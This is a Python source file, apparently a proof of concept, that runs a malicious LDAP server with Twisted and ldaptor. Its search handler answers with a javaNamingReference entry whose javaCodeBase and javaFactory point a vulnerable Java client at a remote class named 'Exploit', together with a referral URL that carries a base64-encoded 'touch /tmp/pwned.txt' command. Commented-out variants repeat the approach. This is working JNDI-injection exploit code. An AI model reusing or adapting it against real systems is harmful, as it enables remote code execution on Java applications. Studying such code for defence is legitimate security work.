import sys
import io
import base64

from twisted.application import service
from twisted.internet.endpoints import serverFromString
from twisted.internet.protocol import ServerFactory
from twisted.python.components import registerAdapter
from twisted.python import log
from ldaptor.inmemory import fromLDIFFile
from ldaptor.interfaces import IConnectedLDAPEntry
from ldaptor.protocols.ldap import ldapserver, ldapsyntax
from ldaptor.protocols.ldap import ldaperrors
from ldaptor.protocols import pureldap
from twisted.internet import defer

LDIF = b"""\
dn: dc=org
dc: org
objectClass: dcObject

dn: dc=example,dc=org
dc: example
objectClass: dcObject
objectClass: organization

dn: ou=people,dc=example,dc=org
objectClass: organizationalUnit
ou: people

dn: cn=bob,ou=people,dc=example,dc=org
cn: bob
gn: Bob
mail: bob@example.org
objectclass: top
objectclass: person
objectClass: inetOrgPerson
sn: Roberts
userPassword: secret

"""

# class ExploitLDAPServer(ldapserver.LDAPServer):
#     def handle_LDAPSearchRequest(self, request, controls, reply):
#         exploit_payload = b"touch /tmp/pwned.txt"
#         entry = ldapsyntax.LDAPEntry(self.factory, request.baseObject)
#         entry._attributes['mail'] = [exploit_payload]

#         search_result = pureldap.LDAPSearchResultEntry(
#             objectName=entry.dn.getText(),
#             attributes=[(attr, vals) for attr, vals in entry._attributes.items()]
#         )
#         reply(search_result)
#         reply(pureldap.LDAPSearchResultDone(resultCode=ldaperrors.Success.resultCode))
#         return defer.succeed(None)  

class ExploitLDAPServer(ldapserver.LDAPServer):
    def handle_LDAPSearchRequest(self, request, controls, reply):
        search_response = pureldap.LDAPSearchResultEntry(
            objectName='cn=bob,ou=people,dc=example,dc=org',
            attributes=[
                    ('mail', [b'touch /tmp/pwned.txt']),
                    ('javaClassName', [b'foo']),
                    ('javaCodeBase', [b'http://127.0.0.1:8001/']),
                    ('objectClass', [b'javaNamingReference']),
                    ('javaFactory', [b'Exploit'])
                ]
        )

        reply(search_response)
        
        # Redirect the client to the URL hosting the malicious Java class
        base64_payload="dG91Y2ggL3RtcC9wd25lZA=="
        referral_url = f'ldap://127.0.0.1:8080/exploit?o={base64_payload}'
        reference = pureldap.LDAPSearchResultReference(uris=[referral_url.encode()])
        reply(reference)

        reply(pureldap.LDAPSearchResultDone(resultCode=ldaperrors.Success.resultCode))
        return defer.succeed(None)  

# class ExploitLDAPServer(ldapserver.LDAPServer):
#     async def handle_LDAPSearchRequest(self, request, controls, reply):
#         search_response = pureldap.LDAPSearchResultEntry(
#             objectName='cn=bob,ou=people,dc=example,dc=org',
#             attributes=[('mail', [b'touch /tmp/pwned.txt'])]
#         )

#         await reply(search_response)

#         # Add the referral response
#         base64_payload="dG91Y2ggL3RtcC9wd25lZA=="
#         referral_url = f'ldap://localhost:8080/exploit?o={base64_payload}'
#         referral_response = pureldap.LDAPSearchResultReference(uris=[referral_url.encode()])
#         await reply(referral_response)

#         done_response = pureldap.LDAPSearchResultDone(resultCode=ldaperrors.Success.resultCode)
#         await reply(done_response)
    

class Tree:
    def __init__(self):
        global LDIF
        self.f = io.BytesIO(LDIF)
        d = fromLDIFFile(self.f)
        d.addCallback(self.ldifRead)

    def ldifRead(self, result):
        self.f.close()
        self.db = result

class LDAPServerFactory(ServerFactory):
    protocol = ExploitLDAPServer

    def __init__(self, root):
        self.root = root

    def buildProtocol(self, addr):
        proto = self.protocol()
        proto.debug = self.debug
        proto.factory = self
        return proto

if __name__ == "__main__":
    from twisted.internet import reactor

    if len(sys.argv) == 2:
        port = int(sys.argv[1])
    else:
        port = 8000
    # First of all, to show logging info in stdout :
    log.startLogging(sys.stderr)
    # We initialize our tree
    tree = Tree()
    # When the LDAP Server protocol wants to manipulate the DIT, it invokes
    # `root = interfaces.IConnectedLDAPEntry(self.factory)` to get the root
    # of the DIT.  The factory that creates the protocol must therefore
    # be adapted to the IConnectedLDAPEntry interface.
    registerAdapter(lambda x: x.root, LDAPServerFactory, IConnectedLDAPEntry)
    factory = LDAPServerFactory(tree.db)
    factory.debug = True
    application = service.Application("ldaptor-server")
    myService = service.IServiceCollection(application)
    serverEndpointStr = f"tcp:{port}"
    e = serverFromString(reactor, serverEndpointStr)
    d = e.listen(factory)
    reactor.run()
